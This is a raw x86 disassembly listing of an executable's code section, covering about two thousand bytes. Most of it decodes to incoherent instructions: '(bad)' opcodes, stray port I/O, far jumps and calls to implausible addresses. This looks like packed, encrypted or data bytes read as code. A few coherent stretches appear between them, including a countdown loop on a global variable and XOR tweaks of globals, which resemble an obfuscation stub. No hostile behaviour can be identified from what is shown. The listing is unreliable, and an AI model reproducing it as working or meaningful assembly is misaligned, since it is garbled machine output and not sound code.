  406795:	ins    DWORD PTR es:[edi],dx
  406796:	sub    al,0x67
  406798:	mov    ds:0xd41b9b0f,al
  40679d:	cmp    DWORD PTR [eax],0x63
  4067a0:	xor    BYTE PTR [ecx],ch
  4067a2:	add    cl,BYTE PTR [ecx+0x695ff93a]
  4067a8:	stos   DWORD PTR es:[edi],eax
  4067a9:	add    BYTE PTR [ecx],dh
  4067ab:	loopne 0x406824
  4067ad:	data16 (bad) 
  4067af:	and    eax,0x1ff7da8d
  4067b4:	pop    ecx
  4067b5:	jae    0x4067c1
  4067b7:	cmp    DWORD PTR [edi+0x6b],ebp
  4067ba:	test   eax,0xbbf636af
  4067bf:	arpl   si,si
  4067c1:	std    
  4067c2:	adc    ecx,edx
  4067c4:	fwait
  4067c5:	cmp    BYTE PTR [esi+eax*2-0x2545ab82],cl
  4067cc:	or     eax,0xfb72a82e
  4067d1:	dec    edi
  4067d2:	fimul  DWORD PTR [ebp+0x71]
  4067d5:	add    al,0x2d
  4067d7:	mov    ah,dh
  4067d9:	jbe    0x4067f5
  4067db:	xchg   edi,eax
  4067dc:	fsub   QWORD PTR [ecx-0x2f]
  4067df:	je     0x40680f
  4067e1:	push   edx
  4067e2:	mov    ch,0x8d
  4067e4:	and    al,0x42
  4067e6:	inc    ebp
  4067e7:	imul   eax,DWORD PTR [ebp+0x79965e40],0x771995e5
  4067f1:	shl    BYTE PTR [ebp+0x7070ef4c],1
  4067f7:	xchg   esp,eax
  4067f8:	jno    0x406809
  4067fa:	mov    BYTE PTR [ebp+0x60e7d921],0xa9
  406801:	xchg   dh,al
  406803:	mov    ebp,edi
  406805:	and    BYTE PTR [edx+0x68],al
  406808:	dec    ebp
  406809:	lods   al,BYTE PTR ds:[esi]
  40680a:	or     BYTE PTR [ecx],dl
  40680c:	or     ebx,DWORD PTR [ecx-0x13f5d8f9]
  406812:	inc    ebx
  406813:	cs jns 0x4067a5
  406816:	sbb    dl,BYTE PTR [edx+edx*1]
  406819:	sahf   
  40681a:	stos   DWORD PTR es:[edi],eax
  40681b:	test   eax,0xbd64132
  406820:	xchg   esp,eax
  406821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406822:	pop    edx
  406823:	mov    ebx,ebp
  406825:	ins    BYTE PTR es:[edi],dx
  406826:	cmc    
  406827:	hlt    
  406828:	jge    0x406894
  40682a:	ds addr16 int3 
  40682d:	pop    edx
  40682e:	hlt    
  40682f:	xchg   edi,eax
  406830:	loop   0x4067b7
  406832:	mov    ecx,0xe688baaa
  406837:	daa    
  406838:	push   edx
  406839:	je     0x406871
  40683b:	dec    edx
  40683c:	fisub  DWORD PTR [ebx]
  40683e:	xchg   BYTE PTR [ebp+ebp*1-0x5f],ah
  406842:	imul   ebx,DWORD PTR [eax-0x6a],0x0
  406846:	(bad)  
  406847:	iret   
  406848:	mov    DWORD PTR [ebx+eiz*4],esp
  40684b:	adc    eax,0xf0dcdd42
  406850:	xor    eax,0x900a0d87
  406855:	mov    edx,0xe93b11f
  40685a:	mov    cl,0x4e
  40685c:	sub    DWORD PTR [esi+0x12],ecx
  40685f:	mov    WORD PTR [esi-0x3211ce5f],es
  406865:	test   BYTE PTR [esi-0x2faf2ae0],0x86
  40686c:	js     0x40686b
  40686e:	cld    
  40686f:	sub    eax,0xd813df75
  406874:	pop    ebp
  406875:	aaa    
  406876:	data16 and ch,BYTE PTR cs:[esi+0x4afe38a9]
  40687e:	into   
  40687f:	fsubp  st(5),st
  406881:	add    eax,0xfcd998
  406886:	jl     0x4068b1
  406888:	outs   dx,DWORD PTR ds:[esi]
  406889:	loope  0x40685f
  40688b:	pop    edx
  40688c:	mov    edi,0xbc22fd86
  406891:	clc    
  406892:	ror    BYTE PTR [esi+edx*1+0x6fd51cdf],0x4b
  40689a:	pop    ss
  40689b:	push   esi
  40689c:	add    bl,dh
  40689e:	push   edi
  40689f:	pop    ebx
  4068a0:	loop   0x4068d6
  4068a2:	sbb    BYTE PTR fs:[edx-0x67],cl
  4068a6:	mov    WORD PTR [ecx-0x7184759d],es
  4068ac:	jno    0x4068c8
  4068ae:	mov    dl,0xf
  4068b0:	xchg   esp,eax
  4068b1:	bound  ecx,QWORD PTR [edx-0x6e]
  4068b4:	dec    ecx
  4068b5:	cmc    
  4068b6:	(bad)  
  4068b7:	aas    
  4068b8:	xor    eax,0x281f59c5
  4068bd:	push   eax
  4068be:	mov    ds:0x3f0c1f04,al
  4068c3:	mov    ds:0xda830e4b,al
  4068c8:	sbb    dh,ch
  4068ca:	jno    0x406887
  4068cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068cd:	rcl    dh,0x23
  4068d0:	and    DWORD PTR [esi*2+0x18c25d3c],esi
  4068d7:	add    BYTE PTR [ebp-0x75],dl
  4068da:	in     al,dx
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	stos   DWORD PTR es:[edi],eax
  40695c:	das    
  40695d:	pop    ecx
  40695e:	mov    esp,0x7878c900
  406963:	fs jle 0x4069de
  406966:	js     0x406981
  406968:	or     ebx,esp
  40696a:	ins    DWORD PTR es:[edi],dx
  40696b:	std    
  40696c:	dec    ecx
  40696d:	xchg   ecx,eax
  40696e:	xchg   ecx,eax
  40696f:	lods   eax,DWORD PTR ds:[esi]
  406970:	xchg   esi,eax
  406971:	push   ss
  406972:	mov    ch,dh
  406974:	jns    0x40696b
  406976:	mov    bh,0x75
  406978:	popa   
  406979:	add    eax,0xb83efda2
  40697e:	in     al,dx
  40697f:	sub    al,0xda
  406981:	push   ecx
  406982:	cmc    
  406983:	(bad)  
  406985:	push   es
  406986:	cmp    al,0xb
  406988:	pop    edx
  406989:	fidivr WORD PTR [edx+ecx*8+0x73298468]
  406990:	push   0xffffffce
  406992:	pop    es
  406993:	adc    BYTE PTR [edx],cl
  406995:	(bad)  
  406996:	(bad)  
  406997:	mov    bh,0x89
  406999:	and    BYTE PTR [ebx],ah
  40699b:	cmp    dl,cl
  40699d:	add    BYTE PTR ds:0xa3300d0c,ah
  4069a3:	or     eax,0x9b07b565
  4069a8:	pop    eax
  4069a9:	cwde   
  4069aa:	mov    ds:0x5a1fd5b,al
  4069af:	imul   ecx,DWORD PTR [ecx],0xc45268a8
  4069b5:	adc    DWORD PTR [ebp+ecx*2+0x10688f3b],esp
  4069bc:	es dec si
  4069bf:	mov    edx,0x174b9a22
  4069c4:	and    eax,0xbefe1a59
  4069c9:	xchg   ebp,eax
  4069ca:	xchg   esp,eax
  4069cb:	fcmovbe st,st(3)
  4069cd:	mov    dl,0xd1
  4069cf:	or     eax,0x108f36cb
  4069d4:	mov    dl,0x4a
  4069d6:	jecxz  0x406a52
  4069d8:	add    ebx,DWORD PTR [eax+0x3c]
  4069db:	pop    ss
  4069dc:	fsub   QWORD PTR [ecx]
  4069de:	cmc    
  4069df:	pop    eax
  4069e0:	or     eax,0x357448bf
  4069e5:	arpl   WORD PTR [ebx],si
  4069e7:	scas   eax,DWORD PTR es:[edi]
  4069e8:	sti    
  4069e9:	jno    0x406a52
  4069eb:	lods   al,BYTE PTR ds:[esi]
  4069ec:	sahf   
  4069ed:	cvtps2pi mm3,QWORD PTR [ebx]
  4069f0:	hlt    
  4069f1:	jg     0x406a04
  4069f3:	test   BYTE PTR [ebx],ch
  4069f5:	xchg   ecx,eax
  4069f6:	psubusb mm5,QWORD PTR [eax]
  4069f9:	mov    bl,0x53
  4069fb:	jbe    0x406994
  4069fd:	jmp    0xdae5:0xd67530f3
  406a04:	mov    DWORD PTR [esi+0x5e],esp
  406a07:	lods   eax,DWORD PTR ds:[esi]
  406a08:	neg    BYTE PTR [ecx+0x11]
  406a0b:	pop    es
  406a0c:	ficomp WORD PTR [ecx-0x548488da]
  406a12:	fucomip st,st(1)
  406a14:	(bad)
  406a17:	std    
  406a18:	stos   DWORD PTR es:[edi],eax
  406a19:	xchg   ebx,eax
  406a1a:	xchg   ebx,eax
  406a1b:	stc    
  406a1c:	ficom  WORD PTR [ebp-0x38]
  406a1f:	fnstsw WORD PTR [ebx+edi*4]
  406a22:	dec    edx
  406a23:	jge    0x406a0a
  406a25:	std    
  406a26:	loope  0x406a89
  406a28:	fst    QWORD PTR [eax]
  406a2a:	pop    esi
  406a2b:	hlt    
  406a2c:	adc    ebx,eax
  406a2e:	jg     0x406a1e
  406a30:	mov    DWORD PTR [edi+edi*8],esp
  406a33:	loop   0x406a6f
  406a35:	stos   BYTE PTR es:[edi],al
  406a36:	mov    eax,ds:0xf36401dc
  406a3b:	scas   eax,DWORD PTR es:[edi]
  406a3c:	ds and ebx,edx
  406a3f:	in     al,0x8b
  406a41:	imul   ebx,DWORD PTR [ebx+0x77],0x0
  406a45:	outs   dx,BYTE PTR ds:[esi]
  406a46:	scas   al,BYTE PTR es:[edi]
  406a47:	jae    0x406a2a
  406a49:	push   edi
  406a4a:	retf   0x3dfd
  406a4d:	xrelease mov DWORD PTR [ebp-0x3b7af4bb],ebx
  406a54:	xchg   edx,eax
  406a55:	jno    0x406a1e
  406a57:	jo     0x406ad5
  406a59:	add    eax,0x9f7b35f7
  406a5e:	in     eax,0x65
  406a60:	int    0x58
  406a62:	cmovle ecx,esp
  406a65:	fwait
  406a66:	or     dh,BYTE PTR [ebx+0x43]
  406a69:	push   eax
  406a6a:	adc    al,0x16
  406a6c:	dec    ebx
  406a6d:	sbb    DWORD PTR [ebx+ebx*1],esi
  406a70:	dec    edx
  406a71:	mov    edx,eax
  406a73:	jge    0x406ac4
  406a75:	sahf   
  406a76:	sub    eax,0xc90e0f
  406a7b:	push   edx
  406a7c:	mov    cl,0x20
  406a7e:	xor    DWORD PTR [ebp+0x7f],0xfffffffc
  406a82:	or     eax,0xd075612b
  406a87:	sub    BYTE PTR [esi+ecx*8],ch
  406a8a:	mov    ds:0xd65e06a1,eax
  406a8f:	loop   0x406ae7
  406a91:	cmp    DWORD PTR [esi+0x39ac20d9],eax
  406a97:	cli    
  406a98:	aaa    
  406a99:	mov    edi,0x643f802d
  406a9e:	cmp    DWORD PTR [esi-0x7a],esi
  406aa1:	dec    esp
  406aa2:	sub    esi,edi
  406aa4:	and    DWORD PTR [ebx-0x1],0x0
  406aa8:	cmp    cl,BYTE PTR [esi-0x18]
  406aab:	test   al,0xd3
  406aad:	push   eax
  406aae:	fucom  st(7)
  406ab0:	and    BYTE PTR [ebp-0x1c680574],ch
  406ab6:	mov    al,ds:0xf8e25fd3
  406abb:	clc    
  406abc:	adc    BYTE PTR [eax+0x6f],bl
  406abf:	add    BYTE PTR [edx-0x153d6c38],dl
  406ac5:	and    ah,dl
  406ac7:	and    ebx,ebx
  406ac9:	xchg   ebx,eax
  406aca:	cs mov dl,0x67
  406acd:	jp     0x406b00
  406acf:	xchg   BYTE PTR [ecx+0x79fc5b2a],cl
  406ad5:	js     0x406a77
  406ad7:	or     bh,BYTE PTR [edi+eax*1+0x17b19d6a]
  406ade:	xchg   edx,eax
  406adf:	shl    BYTE PTR [eax-0x14],0x55
  406ae3:	sbb    DWORD PTR [ebp+0x20],eax
  406ae6:	or     ebp,ebp
  406ae8:	mov    esi,0x6448663e
  406aed:	cwde   
  406aee:	hlt    
  406aef:	jmp    0x406b38
  406af1:	out    0x14,eax
  406af3:	pop    ebp
  406af4:	add    ebx,0xe110a5e8
  406afa:	xlat   BYTE PTR ds:[ebx]
  406afb:	jp     0x406b0d
  406afd:	test   DWORD PTR [edx],esp
  406aff:	xchg   ebp,eax
  406b00:	jp     0x406b43
  406b02:	pop    ebp
  406b03:	out    0x30,al
  406b05:	call   0x37bf7fa4
  406b0a:	and    eax,0xed12e09b
  406b0f:	dec    ebx
  406b10:	outs   dx,DWORD PTR ds:[esi]
  406b11:	test   BYTE PTR [ebx+0x64880399],cl
  406b17:	imul   ebp,edi,0x0
  406b1a:	ja     0x406ab6
  406b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b1d:	fnstenv [ebx-0x26]
  406b20:	or     BYTE PTR [eax-0x1f],0x3d
  406b24:	pop    esp
  406b25:	inc    esi
  406b26:	inc    edi
  406b27:	xor    al,0xba
  406b29:	or     esp,DWORD PTR [edx]
  406b2b:	daa    
  406b2c:	mov    eax,DWORD PTR [ebp+0x6]
  406b2f:	scas   al,BYTE PTR es:[edi]
  406b30:	fistp  QWORD PTR [ebx]
  406b32:	add    eax,0xf4bf9423
  406b37:	inc    esi
  406b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b39:	dec    edi
  406b3a:	nop
  406b3b:	push   ebx
  406b3c:	fs dec edx
  406b3e:	call   0x158d79a3
  406b43:	jmp    0x6ec0:0x5ac0d57b
  406b4a:	pop    eax
  406b4b:	dec    edi
  406b4c:	adc    dl,ah
  406b4e:	mov    bh,0x24
  406b50:	push   0x6a
  406b52:	inc    edx
  406b53:	sbb    eax,0x471f999c
  406b58:	cmc    
  406b59:	call   0xc4fe:0x47645a3c
  406b60:	mov    ecx,0x587c14b2
  406b65:	cmp    DWORD PTR [ebp-0x4c],0x86ca2043
  406b6c:	sub    BYTE PTR [esi],bh
  406b6e:	push   esi
  406b6f:	jno    0x406b77
  406b71:	dec    edi
  406b72:	push   ebx
  406b73:	jns    0x406b97
  406b75:	mov    DWORD PTR [ebx+eax*8],edi
  406b78:	mov    ebx,ds
  406b7a:	sub    cl,BYTE PTR [ecx]
  406b7c:	push   ecx
  406b7d:	fild   QWORD PTR [eax+0x65f7b906]
  406b83:	ja     0x406b32
  406b85:	or     eax,0x2514030b
  406b8a:	les    esi,FWORD PTR [ecx]
  406b8c:	xchg   esi,eax
  406b8d:	xchg   ebx,eax
  406b8e:	pop    esp
  406b8f:	or     eax,0xf7196c80
  406b94:	shr    DWORD PTR [edx+ecx*1+0x2a8b8cd1],cl
  406b9b:	in     al,dx
  406b9c:	and    esi,DWORD PTR [ebx]
  406b9e:	scas   eax,DWORD PTR es:[edi]
  406b9f:	mov    esi,0x76582044
  406ba4:	add    eax,0xde773750
  406ba9:	repnz out dx,al
  406bab:	retf   0x6f8d
  406bae:	mov    ch,0x56
  406bb0:	in     eax,dx
  406bb1:	dec    si
  406bb4:	jmp    0x18bb4d5e
  406bb9:	pusha  
  406bba:	ins    DWORD PTR es:[edi],dx
  406bbb:	call   DWORD PTR [esi-0x58]
  406bbe:	mov    DWORD PTR [edi],0x31e59d8e
  406bc4:	dec    edi
  406bc5:	push   0x6c
  406bc7:	push   esi
  406bc8:	dec    DWORD PTR [eax]
  406bca:	and    ah,0x20
  406bcd:	dec    esi
  406bce:	test   al,0xf7
  406bd0:	mov    ecx,0x4156e7e
  406bd5:	cdq    
  406bd6:	mov    ds:0x18bbef5b,eax
  406bdb:	aas    
  406bdc:	loop   0x406bae
  406bde:	lds    ecx,FWORD PTR [ecx+0x62]
  406be1:	dec    ecx
  406be2:	xchg   edi,eax
  406be3:	push   eax
  406be4:	(bad)  
  406be5:	lock add bh,BYTE PTR [edx-0x46096b66]
  406bec:	jae    0x406c59
  406bee:	mov    ch,0x7a
  406bf0:	inc    esi
  406bf1:	out    0x37,eax
  406bf3:	sahf   
  406bf4:	retf   0x9ff0
  406bf7:	dec    ebp
  406bf8:	pop    ds
  406bf9:	mov    gs,WORD PTR [ecx+0x26027734]
  406bff:	dec    edx
  406c00:	fbstp  TBYTE PTR [edi+0x59]
  406c03:	enter  0x6d26,0xb3
  406c07:	(bad)  
  406c08:	push   ss
  406c09:	cmc    
  406c0a:	sbb    eax,0x6c11e920
  406c0f:	jo     0x406c31
  406c11:	test   BYTE PTR [ebx-0x3],ch
  406c14:	mov    BYTE PTR [ebx-0x10],bl
  406c17:	sub    BYTE PTR [ebx+0x700316d],dl
  406c1d:	dec    ebp
  406c1e:	pusha  
  406c1f:	add    ch,ah
  406c21:	cmp    DWORD PTR [ecx+0x16d8fd92],eax
  406c27:	in     eax,dx
  406c28:	pop    esp
  406c29:	in     eax,dx
  406c2a:	lds    edx,FWORD PTR [edx]
  406c2c:	outs   dx,DWORD PTR ds:[esi]
  406c2d:	fstp   DWORD PTR [ebp-0x21]
  406c30:	daa    
  406c31:	mov    eax,ds:0xe827041a
  406c36:	mov    BYTE PTR [edx-0x3b],dh
  406c39:	add    eax,DWORD PTR [edx-0x627a49f7]
  406c3f:	test   eax,0xb6bccd69
  406c44:	popf   
  406c45:	aad    0xa9
  406c47:	fimul  WORD PTR [ecx+0x488b4a61]
  406c4d:	mov    ah,0x21
  406c4f:	jnp    0x406be2
  406c51:	ss xor al,0xb8
  406c54:	mov    al,BYTE PTR ss:[eax]
  406c57:	add    BYTE PTR [ecx+0x42a7c915],al
  406c5d:	add    dl,ch
  406c5f:	dec    edi
  406c60:	add    BYTE PTR [eax],al
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x2f],ebx
  406c91:	ror    DWORD PTR [esi-0x41],1
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cf8
  406c9d:	xor    BYTE PTR [esp+esi*1+0x3a],cl
  406ca1:	sub    eax,0xb87ae85f
  406ca6:	mov    es,WORD PTR [ebx]
  406ca8:	int3   
  406ca9:	sub    dh,BYTE PTR [ecx-0x295f259c]
  406caf:	push   0xffffffcf
  406cb1:	ja     0x406d12
  406cb3:	push   ebx
  406cb4:	fimul  WORD PTR [eax-0x74f4f83b]
  406cba:	sar    DWORD PTR [edx+0x1ceb758a],1
  406cc0:	mov    bl,0xf4
  406cc2:	popf   
  406cc3:	fst    QWORD PTR [bx+di]
  406cc6:	dec    edi
  406cc7:	repz mov ds:0xde01984f,eax
  406ccd:	jmp    0x406d1b
  406ccf:	pop    ecx
  406cd0:	jnp    0x406cdd
  406cd2:	out    dx,eax
  406cd3:	sbb    eax,0x2a45dc0c
  406cd8:	sbb    ecx,0x74
  406cdb:	retf   0x3d24
  406cde:	(bad)  
  406cdf:	jmp    0xed854b04
  406ce4:	in     al,0x10
  406ce6:	cmp    al,0xaf
  406ce8:	jl     0x406c7c
  406cea:	sti    
  406ceb:	adc    eax,0x315f6330
  406cf0:	aas    
  406cf1:	jae    0x406d49
  406cf3:	mov    esi,edx
  406cf5:	mov    eax,0xccd9d6ce
  406cfa:	xchg   ecx,eax
  406cfb:	ror    BYTE PTR [edi],1
  406cfd:	js     0x406d0e
  406cff:	lea    ebp,[edi]
  406d01:	push   ds
  406d02:	and    esi,edi
  406d04:	pushf  
  406d05:	retf   
  406d06:	mov    edi,0xb583c46d
  406d0b:	scas   eax,DWORD PTR es:[edi]
  406d0c:	sbb    al,0x5
  406d0e:	jle    0x406d02
  406d10:	push   eax
  406d11:	call   0x5f4aee5e
  406d16:	mov    dl,BYTE PTR [esp+ebp*8-0x7e]
  406d1a:	mov    ebp,0xc0bc7ad5
  406d1f:	mov    ch,0x6
  406d21:	imul   ecx,DWORD PTR [ecx+ecx*8+0x2b],0x8fa23e55
  406d29:	jnp    0x406d2f
  406d2b:	push   es
  406d2c:	mov    eax,0x3b115f8e
  406d31:	cwde   
  406d32:	pop    esi
  406d33:	sub    DWORD PTR es:[ebx+0x214240fa],esp
  406d3a:	(bad)  
  406d3b:	sbb    eax,0x8d1efff1
  406d40:	test   DWORD PTR [edi+0x37569562],edx
  406d46:	inc    ecx
  406d47:	repz inc esp
  406d49:	push   es
  406d4a:	xchg   BYTE PTR [edx+0x76347e7a],cl
  406d50:	in     eax,dx
  406d51:	inc    ebx
  406d52:	ror    DWORD PTR [ebx+edi*2],1
  406d55:	pusha  
  406d56:	(bad)  
  406d57:	mov    eax,ds:0x5bf61bcb
  406d5c:	jmp    0x20efac95
  406d61:	imul   ecx,edi,0x50
  406d64:	aaa    
  406d65:	(bad)  
  406d66:	gs jae 0x406d48
  406d69:	jne    0x406d2d
  406d6b:	fsub   QWORD PTR [edx+0x28cc2727]
  406d71:	xchg   esi,eax
  406d72:	xor    DWORD PTR [esi],esp
  406d74:	fiadd  DWORD PTR [ebx-0x6d]
  406d77:	xor    al,0xb6
  406d79:	mov    cl,0x1
  406d7b:	jge    0x406d21
  406d7d:	rcl    DWORD PTR [ecx+0x3d1ed45a],0x49
  406d84:	test   al,0x48
  406d86:	retf   0xc65b
  406d89:	in     eax,0x4
  406d8b:	xlat   BYTE PTR ds:[ebx]
  406d8c:	sbb    ebp,edx
  406d8e:	(bad)  
  406d8f:	gs push esi
  406d91:	pushf  
  406d92:	(bad)  
  406d93:	dec    ebp
  406d94:	push   edx
  406d95:	hlt    
  406d96:	pop    edi
  406d97:	add    bl,al
  406d99:	jge    0x406d45
  406d9b:	jnp    0x406d4b
  406d9d:	in     al,dx
  406d9e:	mov    al,ds:0xe1c43f63
  406da3:	or     ebx,DWORD PTR [esi]
  406da5:	leave  
  406da6:	retf   0xe1ce
  406da9:	adc    eax,0x162fd136
  406dae:	mov    edx,0xc0359aa9
  406db3:	fcomip st,st(0)
  406db5:	push   ebp
  406db6:	popa   
  406db7:	(bad)  
  406db8:	mov    ah,0x47
  406dba:	or     eax,0x666d64ff
  406dbf:	xor    eax,0xeb709aa4
  406dc4:	lods   eax,DWORD PTR ds:[esi]
  406dc5:	dec    eax
  406dc6:	cs pshufw mm2,mm5,0xea
  406dcb:	out    dx,al
  406dcc:	jl     0x406d8f
  406dce:	pusha  
  406dcf:	dec    esp
  406dd0:	dec    ecx
  406dd1:	sbb    al,0x37
  406dd3:	xchg   ecx,eax
  406dd4:	and    ecx,edx
  406dd6:	mov    ds:0x6d5ebabc,eax
  406ddb:	jle    0x406d67
  406ddd:	arpl   WORD PTR [eax+0x69],cx
  406de0:	fldenv [eax+0x6d]
  406de3:	pop    es
  406de4:	push   esi
  406de5:	mov    ch,0x98
  406de7:	xchg   edi,eax
  406de8:	jmp    0x2f74e8b8
  406ded:	lods   al,BYTE PTR ds:[esi]
  406dee:	dec    ebp
  406def:	je     0x406d79
  406df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df2:	jb     0x406da5
  406df4:	add    eax,DWORD PTR [edx-0x67]
  406df7:	push   edx
  406df8:	(bad)  
  406df9:	stc    
  406dfa:	jb     0x406da2
  406dfc:	mov    ebx,0x9c2a5212
  406e01:	pop    esi
  406e02:	call   0xbb2cabcc
  406e07:	jg     0x406d98
  406e09:	out    dx,al
  406e0a:	push   0x35f91c5f
  406e0f:	jmp    0xb02a9438
  406e14:	cmp    DWORD PTR [eax],eax
  406e16:	jg     0x406da9
  406e18:	outs   dx,DWORD PTR ds:[esi]
  406e19:	int3   
  406e1a:	popf   
  406e1b:	push   cs
  406e1c:	dec    edx
  406e1d:	mov    ebp,0xf47d5d1c
  406e22:	cmp    DWORD PTR [esi-0x2b],eax
  406e25:	cld    
  406e26:	call   0x99f0186
  406e2b:	or     BYTE PTR [edi-0x3bddb743],cl
  406e31:	xor    al,0x98
  406e33:	mov    dl,0xb4
  406e35:	push   ss
  406e36:	mov    ds:0x1ce8575c,al
  406e3b:	faddp  st(6),st
  406e3d:	ds xchg ecx,eax
  406e3f:	sub    eax,0x976060c8
  406e44:	imul   edi,esp,0xffffffcd
  406e47:	add    al,0xd7
  406e49:	lea    ebx,[edi+0x5f067ac]
  406e4f:	cdq    
  406e50:	into   
  406e51:	xor    DWORD PTR [di],esi
  406e54:	fcomip st,st(5)
  406e56:	dec    esp
  406e57:	mov    ebp,0x42e0b759
  406e5c:	mov    edi,0x348dc672
  406e61:	mov    eax,ds:0x229caa9b
  406e66:	cmp    BYTE PTR [eax],cl
  406e68:	out    0xf0,eax
  406e6a:	mov    edi,ebx
  406e6c:	mov    ah,0xd6
  406e6e:	and    cl,BYTE PTR [ebx]
  406e70:	cmp    cl,ah
  406e72:	aaa    
  406e73:	or     ah,bl
  406e75:	pop    ebx
  406e76:	push   ebp
  406e77:	imul   DWORD PTR [ebx]
  406e79:	pop    ss
  406e7a:	jae    0x406e48
  406e7c:	scas   eax,DWORD PTR es:[edi]
  406e7d:	inc    esp
  406e7e:	outs   dx,BYTE PTR ds:[esi]
  406e7f:	bound  edx,QWORD PTR [edx+0x6f012ef3]
  406e85:	jg     0x406e2d
  406e87:	cdq    
  406e88:	pop    ss
  406e89:	test   DWORD PTR [ebp+0x24419cda],ebx
  406e8f:	jbe    0x406e77
  406e91:	jge    0x406efc
  406e93:	sbb    DWORD PTR [edi],ecx
  406e95:	ror    DWORD PTR [ecx-0x29],0xd5
  406e99:	test   BYTE PTR [eax-0x59ae7103],bl
  406e9f:	iret   
  406ea0:	sub    ebp,ecx
  406ea2:	repz or eax,0xdb332a0d
  406ea8:	cmc    
  406ea9:	ja     0x406e66
  406eab:	ss mov esi,0x9a72f432
  406eb1:	and    al,0x5f
  406eb3:	in     eax,0xdf
  406eb5:	sti    
  406eb6:	cmp    BYTE PTR [ecx],bl
  406eb8:	rcr    BYTE PTR [esi+0x14],cl
  406ebb:	mov    dh,0x72
  406ebd:	sbb    al,0xbc
  406ebf:	adc    DWORD PTR [ebx-0x11a35edc],edx
  406ec5:	jecxz  0x406f1f
  406ec7:	scas   al,BYTE PTR es:[edi]
  406ec8:	xor    eax,0x7a52d765
  406ecd:	and    edi,DWORD PTR ds:0x36fec04e
  406ed3:	push   esp
  406ed4:	mov    ds:0x6c00bdc0,al
  406ed9:	imul   bx,WORD PTR fs:[edi-0x7a],0xcd92
  406ee0:	xor    edx,eax
  406ee2:	outs   dx,BYTE PTR ds:[esi]
  406ee3:	inc    eax
  406ee4:	xchg   ebx,eax
  406ee5:	push   esi
  406ee6:	js     0x406f3b
  406ee8:	sahf   
  406ee9:	es pushf 
  406eeb:	dec    esp
  406eec:	into   
  406eed:	mov    DWORD PTR [ebp-0x22841a93],eax
  406ef3:	inc    ebp
  406ef4:	bound  edx,QWORD PTR [edx+eiz*8-0x2557676f]
  406efb:	sbb    eax,0xbf7c6df7
  406f00:	shl    edx,1
  406f02:	push   cs
  406f03:	(bad)  
  406f04:	mov    eax,0xec400a2
  406f09:	cmp    edx,esp
  406f0b:	aaa    
  406f0c:	push   es
  406f0d:	cmp    esp,esi
  406f0f:	inc    ebp
  406f10:	inc    ebx
  406f11:	add    dh,BYTE PTR [eax-0x6ef3878a]
  406f17:	jge    0x406f12
  406f19:	push   cs
  406f1a:	mov    esi,0x89eaf7b8
  406f1f:	retf   0xc967
  406f22:	jnp    0x406f26
  406f24:	push   esp
  406f25:	mov    eax,ds:0x2f5da500
  406f2a:	or     ch,BYTE PTR [ebp+0x2a23e08f]
  406f30:	adc    DWORD PTR ds:[esi],esi
  406f33:	neg    DWORD PTR [ebx]
  406f35:	sbb    BYTE PTR [ecx-0x397fa868],bh
  406f3b:	call   0x427de9fa
  406f40:	xchg   edi,eax
  406f41:	add    BYTE PTR [eax-0x6a64a119],ah
  406f47:	lock and DWORD PTR [ebx-0x12184853],ebx
  406f4e:	mov    edx,0x63c61103
  406f53:	jmp    0x406f6f
  406f55:	jne    0x406f42
  406f57:	bound  esi,QWORD PTR [edi]
  406f59:	push   ss
  406f5a:	push   ecx
  406f5b:	pop    ebp
  406f5c:	mov    al,0x72
  406f5e:	sub    dl,BYTE PTR [ebx-0x7f]
  406f61:	pop    ebx
  406f62:	xchg   edx,eax
  406f63:	dec    esp
  406f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f65:	push   eax
  406f66:	jmp    0x10ed:0x6265001c
  406f6d:	sbb    eax,ecx
  406f6f:	int3   
  406f70:	xchg   esi,eax
  406f71:	inc    ecx
  406f72:	sub    BYTE PTR [edx],0x23
  406f75:	enter  0x6509,0x1
  406f79:	cli    
  406f7a:	imul   eax,DWORD PTR [eax+0x63],0xbd851c7f
  406f81:	lods   al,BYTE PTR ds:[esi]
  406f82:	xchg   BYTE PTR [eax],bl
  406f84:	push   eax
  406f85:	popf   
  406f86:	ins    DWORD PTR es:[edi],dx
  406f87:	inc    eax
  406f88:	add    ax,cx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
